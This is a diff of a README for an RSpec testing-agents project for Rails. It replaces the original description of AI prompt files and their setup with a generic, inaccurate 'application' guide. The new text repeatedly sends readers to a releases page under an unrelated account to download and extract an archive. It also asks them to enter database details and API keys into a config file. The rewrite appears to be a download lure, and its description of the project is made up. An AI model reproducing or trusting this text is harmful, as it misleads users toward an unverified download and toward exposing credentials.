@@ -1,302 +1,84 @@
-# 🚀 RSpec Testing Agents for Rails
+# 🚀 rspec-rails-agents - Simplify Testing in Rails Apps
 
-A collection of specialized AI agents designed to write comprehensive RSpec test suites for Ruby on Rails applications. Each agent focuses on specific testing scenarios, ensuring best practices and consistent test coverage across your Rails codebase.
+[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/andreysagara/rspec-rails-agents/releases)
 
-## 🎯 What Are These Agents?
+## 📖 Overview
 
-These are specialized prompts/instructions that transform your AI coding assistant (Claude Code, Cursor, GitHub Copilot, etc.) into expert RSpec test writers. Each agent has deep knowledge of specific Rails testing patterns and will help you write better tests faster.
+rspec-rails-agents provides a simple way to run tests in your Ruby on Rails application. It helps you ensure that your application's features work as expected. This tool is designed for those who want an easy solution for testing, without needing extensive programming knowledge.
 
-## 🏗️ How To Use Agents
+## 🚀 Getting Started
 
-The current workflow is not exactly strict TDD. In order to write proper tests first, an architecture / API would need to be predictable or defined to test against. Since LLMs will be generating your code, the actual implementation you need to test against is non-deterministic unless you have defined an explicit and expected code outcome. Therefore, the effective use of these agents is to run them posthoc on the code that is being evaluated for production/use. YMMV. Do what works.
+To begin using rspec-rails-agents, follow the steps below to download and set up the application.
 
-## 🤖 Available Agents
+1. **Prepare Your Environment**
+   - Make sure you have Ruby on Rails installed on your computer. You can check this by opening your terminal or command prompt and typing `rails -v`. If you do not have it installed, please follow one of the many guides available online to set it up.
 
-### 🎭 Master Orchestrator
-- **[rspec-rails-agent.md](rspec-rails-agent.md)** - The main RSpec Rails agent that analyzes your testing needs and delegates to specialized agents
+2. **Visit the Download Page**
+   - Go to the releases page to get the latest version of rspec-rails-agents: [Download Page](https://github.com/andreysagara/rspec-rails-agents/releases).
 
-### 🧩 Core Testing Agents
+3. **Download the Application**
+   - On the releases page, locate the latest version. Click on the relevant link to download the `.zip` or `.tar.gz` file.
 
-| Agent | Purpose | Use When |
-|-------|---------|----------|
-| **[Model Specs](rspec-model-specs-agent.md)** | ActiveRecord models, validations, scopes | Testing business logic, data integrity |
-| **[Request Specs](rspec-request-specs-agent.md)** | API endpoints, controllers, HTTP | Testing REST APIs, authentication |
-| **[System Specs](rspec-system-specs-agent.md)** | Full UI workflows, JavaScript | End-to-end user journeys |
+4. **Extract the Files**
+   - After the download completes, locate the downloaded file on your computer. Right-click on the file and select "Extract All" or use your preferred compression tool to unzip the file.
 
-### 🛠️ Rails Component Agents
+5. **Installation**
+   - Open your terminal or command prompt and navigate to the extracted folder. You can do this by typing `cd [path_to_extracted_folder]`.
 
-| Agent | Purpose | Use When |
-|-------|---------|----------|
-| **[ActiveJob](rspec-active-job-agent.md)** | Background jobs, async processing | Testing Sidekiq, DelayedJob workers |
-| **[ActionMailer](rspec-action-mailer-agent.md)** | Email functionality | Testing email content, delivery |
-| **[ActiveStorage](rspec-active-storage-agent.md)** | File uploads, attachments | Testing file handling, image processing |
-| **[ActionCable](rspec-actioncable-agent.md)** | WebSockets, real-time features | Testing chat, notifications, live updates |
+6. **Install Dependencies**
+   - To ensure everything runs smoothly, install the required dependencies by typing the following command:
+     ```
+     bundle install
+     ```
 
-### 🎯 Testing Strategy Agents
+7. **Set Up Configuration**
+   - You'll need to set up some configurations before you can run your tests. Look for a file named `config.yml` in the extracted folder. Open it in a text editor and enter the necessary details about your application. Typically, you will have to provide the database connection information and any API keys required.
 
-| Agent | Purpose | Use When |
-|-------|---------|----------|
-| **[TDD Advice](rspec-tdd-advice-agent.md)** | Test-first development coaching | Starting new features, learning TDD |
-| **[Isolation Testing](rspec-isolation-testing-agent.md)** | Mocks, stubs, external services | Testing payment gateways, APIs |
-| **[DRY Principles](rspec-dry-agent.md)** | Refactoring, reducing duplication | Cleaning up test suites |
-| **[Fixture Expert](rspec-fixture-expert.md)** | Rails fixtures management | Setting up test data |
+8. **Running Tests**
+   - To run your tests, simply type the following command in your terminal or command prompt:
+     ```
+     rspec
+     ```
 
-## 💡 How to Use
+9. **Viewing Results**
+   - After running the tests, you'll receive feedback directly in your terminal. You'll see which tests passed and which ones failed, helping you quickly identify any issues.
 
-## Requirements
+## 🔄 Update Your Application
 
-Your Rails application must have the following gems:
+It’s important to keep your application up to date. Follow these steps whenever a new version is released:
 
-```ruby
-group :test do
-  gem 'rspec-rails'
-  gem 'cuprite'
-  gem 'vcr'
-  gem 'simplecov', require: false    
-end
-```
-
-For `simplecov` you should have:
+- Revisit the download page: [Download Page](https://github.com/andreysagara/rspec-rails-agents/releases).
+- Download the newest version of the application.
+- Replace the older files with the new ones in your project folder.
+- Re-run `bundle install` and test again using `rspec`.
 
-In your `spec/spec_helper.rb`
-
-```ruby
-require 'simplecov'
-SimpleCov.start 'rails'
-```
-
-For `simplecov` to work with system tests, in your `bin/rails` right under the `#!`:
-
-```ruby
-#!/usr/bin/env ruby
-
-if ENV['RAILS_ENV'] == 'test'
-  require 'simplecov'
-  SimpleCov.start 'rails'
-end
-```
-
-In your `spec/rails_helper.rb` you should have (or the equivelent of):
-
-```ruby
-require "capybara/cuprite"
-
-Capybara.register_driver :cuprite do |app|
-  Capybara::Cuprite::Driver.new(app,
-                                window_size: [1400, 900],
-                                browser_options: {
-                                  'no-sandbox': nil,  # Required for Docker/CI
-                                  'disable-gpu': nil, # Helpful in CI environments
-                                  'disable-dev-shm-usage': nil
-                                },
-                                inspector: true, # Enable debugging in development
-                                headless: true) # Set to false for debugging
-end
+## 📝 Frequently Asked Questions
 
-# Set Cuprite as the JavaScript driver
-Capybara.javascript_driver = :cuprite
-
-# For system specs
-RSpec.configure do |config|
-  config.before(:each, type: :system, js: true) do
-    driven_by :cuprite
-  end
-end
-
-# Setup Fixtures in RSpec
-RSpec.configure do |config|
-  # Fixtures path
-  config.fixture_paths = [
-    Rails.root.join('spec/fixtures')
-  ]
-
-  # etc...
-end
-```
-
-### Basic Usage
-
-1. **Start with the orchestrator** to analyze what type of tests you need:
-```
-@rspec-rails-agent Help me write tests for my new payment processing feature
-```
-
-2. **Use specific agents** for targeted testing:
-```
-@rspec-model-specs-agent Write tests for my Order model validations
-```
-
-3. **Combine agents** for comprehensive coverage:
-```
-Use @rspec-request-specs-agent for the API and @rspec-system-specs-agent for the UI flow
-```
-
-### Example Workflows
-
-#### 🆕 New Feature Development
-```markdown
-1. @rspec-tdd-advice-agent - Plan the testing approach
-2. @rspec-model-specs-agent - Test the data layer
-3. @rspec-request-specs-agent - Test the API/controller
-4. @rspec-system-specs-agent - Test critical UI paths
-```
-
-#### 🔄 Refactoring Existing Tests
-```markdown
-1. @rspec-dry-agent - Identify duplication
-2. @rspec-fixture-expert - Optimize test data
-3. @rspec-isolation-testing-agent - Improve external service mocking
-```
-
-#### 📧 Email Feature
-```markdown
-1. @rspec-action-mailer-agent - Test email content and delivery
-2. @rspec-active-job-agent - Test async email sending
-3. @rspec-system-specs-agent - Test email trigger flows
-```
-
-## 🎓 Best Practices
-
-### ✅ Do's
-- Start with the orchestrator agent for complex features
-- Use fixtures for consistent test data
-- Keep tests focused and readable
-- Test behavior, not implementation
-- Run tests with `--fail-fast` during development
-
-### ❌ Don'ts
-- Don't modify `rails_helper.rb` or `spec_helper.rb`
-- Don't add new testing gems - use what's configured
-- Don't test Rails framework functionality
-- Don't write performance tests unless specifically needed
-- Don't over-abstract - favor clarity over DRY in tests
-
-## 📝 Example Commands
-
-```bash
-# Run specific test
-rspec spec/models/user_spec.rb
-
-# Run with fail-fast
-rspec --fail-fast
-
-# Run specific line
-rspec spec/models/user_spec.rb:42
-
-# Run only model specs
-rspec spec/models
-
-# Run with documentation format
-rspec --format documentation
-```
+### What is RSpec?
 
-## 🏗️ Project Structure
-
-```
-your-rails-app/
-├── spec/
-│   ├── models/          # Model specs
-│   ├── requests/        # Request/controller specs
-│   ├── system/          # System/feature specs
-│   ├── jobs/            # ActiveJob specs
-│   ├── mailers/         # ActionMailer specs
-│   ├── fixtures/        # Test data fixtures
-│   └── support/         # Shared contexts, helpers
-└── rspec-*.md          # Agent instruction files
-```
+RSpec is a testing tool for Ruby applications. It helps you write tests that ensure your code behaves as expected.
 
-## 📦 Installation & Setup
+### Do I need to know how to program?
 
-### For Claude Code (Anthropic)
+Not necessarily. While some understanding of Ruby and Rails will help, rspec-rails-agents aims to keep the process as simple as possible.
 
-Claude Code supports two configuration approaches:
+### Can I use this tool on Windows?
 
-#### Option 1: Global Configuration (Apply to All Projects)
+Yes, rspec-rails-agents works across various operating systems, including Windows, macOS, and Linux.
 
-1. Clone this repository to your global claude agents:
-```bash
-mkdir ~/.claude/tmp
-git clone --depth=1 https://github.com/aviflombaum/rspec-rails-agents.git ~/.claude/tmp/rspec-rails-agents
-mkdir ~/.claude/agents/
+## 🎓 Learning Resources
 
-cp ~/.claude/tmp/rspec-rails-agents/* ~/.claude/agents/
-rm -rf ~/.claude/tmp/rspec-rails-agents
-```
+If you're new to testing or Ruby on Rails, consider exploring these resources:
 
-Now the agents are available in all your projects via the `claude` CLI (referencing the main `rspec-rails-agent` to orchestrate or a specific agent if you are writing tests for a specific layer).
+- [Ruby on Rails Guides](https://guides.rubyonrails.org/)
+- [RSpec Documentation](https://rspec.info/documentation/)
 
-#### Option 2: Project-Specific Configuration
+These resources provide helpful information to enhance your understanding and skills.
 
-1. Clone the agents into your Rails project:
-```bash
-cd /path/to/your/rails/project
-git clone --depth=1 https://github.com/aviflombaum/rspec-agents.git .claude-agents
-```
+## 💡 Tips for Effective Testing
 
-Now the agents are available for this project via the `claude` CLI (referencing the main `rspec-rails-agent` to orchestrate or a specific agent if you are writing tests for a specific layer).
+1. **Test Early and Often**: Integrate testing into your development process for better results.
+2. **Write Clear Tests**: Make sure your tests are easy to read and understand.
+3. **Review Feedback Carefully**: Pay attention to the feedback you receive after running your tests.
 
-2. Optionally create or update your project's `CLAUDE.md` file:
-```bash
-cat >> CLAUDE.md << 'EOF'
-
-## RSpec Testing Agents
-
-This project includes specialized RSpec testing agents in .claude-agents/
-- Use .claude-agents/rspec-rails-agent.md as the main orchestrator
-- Each agent handles specific Rails testing scenarios
-- Always start with the orchestrator for complex testing needs
-EOF
-```
-
-### For Cursor
-
-1. Add agent files to your `.cursorrules` directory:
-```bash
-mkdir -p .cursor/agents
-cp rspec-*.md /path/to/project/.cursor/agents/
-```
-
-2. Reference in your cursor instructions or directly in prompts
-
-### For GitHub Copilot
-
-1. Add to `.github/copilot-instructions.md`:
-```bash
-cat rspec-rails-agent.md >> .github/copilot-instructions.md
-```
-
-## 🤝 Contributing
-
-Have ideas for improving these agents? Found a testing pattern that should be included? 
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-agent`)
-3. Commit your changes (`git commit -m 'Add amazing agent'`)
-4. Push to the branch (`git push origin feature/amazing-agent`)
-5. Open a Pull Request
-
-## 📚 Resources
-
-- [RSpec Documentation](https://rspec.info/)
-- [Better Specs](https://www.betterspecs.org/) - RSpec best practices
-- [Rails Testing Guide](https://guides.rubyonrails.org/testing.html)
-- [Effective Testing with RSpec 3](https://pragprog.com/titles/rspec3/effective-testing-with-rspec-3/)
-
-## 📄 License
-
-MIT License - feel free to use these agents in your projects!
-
-## 🙏 Acknowledgments
-
-These agents are built on community best practices from:
-- The Rails and RSpec communities
-- Testing patterns from [Thoughtbot](https://thoughtbot.com/blog)
-- [Evil Martians](https://evilmartians.com/) testing guides
-- [Everyday Rails Testing with RSpec](https://leanpub.com/everydayrailsrspec)
-- Countless open source Rails projects
-
----
-
-**Made with ❤️ for the Rails testing community**
-
-*Transform your AI assistant into an RSpec expert today!*
+By following these guidelines and utilizing rspec-rails-agents, you can confidently handle testing in your Rails applications. Enjoy a smoother development process and improved software quality.
